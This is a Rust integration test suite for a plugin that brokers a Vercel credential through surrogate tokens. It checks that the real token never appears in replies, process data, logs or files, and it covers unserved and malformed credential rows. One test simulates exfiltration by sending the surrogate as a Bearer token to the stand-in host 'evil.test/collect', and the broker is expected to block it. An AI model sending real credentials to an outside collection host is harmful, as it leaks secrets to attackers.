//! A connection's credential, through the installed plugin as a real process:
//! the parent sends the token in the run spec's `credentials` row, the child
//! gets an `osr_` surrogate for a provider the plugin has no local tool for,
//! and the token is in nothing the plugin writes, runs with or leaves behind.
//!
//! No request here reaches a provider: these runs are refused before the
//! broker would dial. The upstream side is `upstream_override.rs`.

mod plugin_support;

use std::path::Path;
use std::time::Duration;

use plugin_support::{through_proxy, wait_for, Install, Plugin};
use serde_json::{json, Value};

const TOKEN: &str = "CANARY-vercel-token-5b7e-never-written-anywhere";

fn spec(install: &Install, run_id: &str, credentials: &Value) -> Value {
    json!({
        "run_id": run_id,
        "ttl_secs": 60,
        "entries": [{
            "env_var": "VERCEL_TOKEN",
            "provider_id": "vercel",
            "connection_ref": "conn://acme/vercel",
            "site": "authorization",
            "methods": ["GET"],
            "path_prefixes": ["/v2/user"],
        }],
        "credentials": credentials,
        "notices_path": install.notices(),
    })
}

fn credentials() -> Value {
    json!([{ "connection_ref": "conn://acme/vercel", "secret": TOKEN }])
}

fn bearer(host: &str, path: &str, surrogate: &str) -> String {
    format!(
        "GET {path} HTTP/1.1\r\nHost: {host}\r\nAuthorization: Bearer {surrogate}\r\n\
         Content-Length: 0\r\nConnection: close\r\n\r\n"
    )
}

/// Every file under `dir`, read lossily.
fn every_file(dir: &Path) -> Vec<(String, String)> {
    let mut found = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return found;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            found.extend(every_file(&path));
        } else if let Ok(bytes) = std::fs::read(&path) {
            found.push((
                path.display().to_string(),
                String::from_utf8_lossy(&bytes).into_owned(),
            ));
        }
    }
    found
}

fn started(install: &Install, run_id: &str) -> (Plugin, Value, String) {
    let mut plugin = install.spawn_logged();
    plugin.send(&spec(install, run_id, &credentials()));
    let reply = plugin.reply();
    let surrogate = reply["env"]["VERCEL_TOKEN"]
        .as_str()
        .unwrap_or_else(|| panic!("a surrogate for VERCEL_TOKEN: {reply}"))
        .to_owned();
    (plugin, reply, surrogate)
}

#[tokio::test(flavor = "multi_thread")]
async fn a_connection_with_a_credential_is_served_and_the_token_is_written_nowhere() {
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = started(&install, "dev-run-c1");
    assert!(surrogate.starts_with("osr_"), "{surrogate}");
    assert_ne!(surrogate, TOKEN);
    assert_eq!(reply["unserved"], json!([]), "{reply}");
    assert!(
        !reply.to_string().contains(TOKEN),
        "the reply holds a token"
    );

    #[cfg(target_os = "linux")]
    {
        let pid = plugin.child.id();
        for file in ["cmdline", "environ"] {
            let bytes = std::fs::read(format!("/proc/{pid}/{file}")).unwrap();
            assert!(
                !String::from_utf8_lossy(&bytes).contains(TOKEN),
                "/proc/{pid}/{file}"
            );
        }
    }

    // The first thing a misdirected surrogate does is trip the run; the event
    // and the notices say what happened without the token or the surrogate.
    let (status, _) = through_proxy(
        &reply,
        "evil.test",
        &bearer("evil.test", "/collect", &surrogate),
    )
    .await
    .expect("the proxy terminates the exfiltration host");
    assert_eq!(status, 403);
    let event = plugin.reply();
    assert_eq!(event["event"], "tripwire", "{event}");
    assert_eq!(event["fence"], "surrogate.misdirected");
    assert!(!event.to_string().contains(TOKEN));
    assert!(!event.to_string().contains(&surrogate));

    // Revoked at once: the same surrogate, sent where it belongs, redeems
    // nothing, so the token is never spent and no request leaves the machine.
    let (status, body) = through_proxy(
        &reply,
        "api.vercel.com",
        &bearer("api.vercel.com", "/v2/user", &surrogate),
    )
    .await
    .expect("the listener still serves the run, so a late use is seen");
    assert_eq!(status, 403, "{body}");
    let notices = wait_for(&install.notices(), "surrogate.revoked");
    assert!(notices.contains("surrogate.misdirected"), "{notices}");
    assert!(notices.contains("surrogate.revoked"), "{notices}");

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
    let rest = plugin.rest();
    assert!(!rest.contains(TOKEN), "{rest}");

    let stderr = std::fs::read_to_string(install.stderr_log()).unwrap_or_default();
    assert!(!stderr.contains(TOKEN), "{stderr}");
    for (path, text) in every_file(install.dir.path()) {
        assert!(!text.contains(TOKEN), "{path}");
        assert!(!text.contains(&surrogate), "{path}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn without_a_credential_the_provider_is_unserved_and_issued_nothing() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    plugin.send(&spec(&install, "dev-run-c2", &json!([])));
    let reply = plugin.reply();
    assert_eq!(reply["unserved"], json!(["VERCEL_TOKEN"]), "{reply}");
    assert!(reply["env"]["VERCEL_TOKEN"].is_null(), "{reply}");
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_for_some_other_connection_serves_nothing() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    let others = json!([{ "connection_ref": "conn://acme/other/vercel", "secret": TOKEN }]);
    plugin.send(&spec(&install, "dev-run-c3", &others));
    let reply = plugin.reply();
    assert_eq!(reply["unserved"], json!(["VERCEL_TOKEN"]), "{reply}");
    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_malformed_credential_row_fails_the_run_with_a_class_and_no_value() {
    let install = Install::pinned(true);
    let mut plugin = install.spawn(&[]);
    let twice = json!([
        { "connection_ref": "conn://acme/vercel", "secret": TOKEN },
        { "connection_ref": "conn://acme/vercel", "secret": "second-secret-value" },
    ]);
    plugin.send(&spec(&install, "dev-run-c4", &twice));
    let reply = plugin.reply();
    assert_eq!(reply["error"], "spec_credential", "{reply}");
    assert!(!reply.to_string().contains(TOKEN));
    assert!(!reply.to_string().contains("second-secret-value"));
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(2));
}
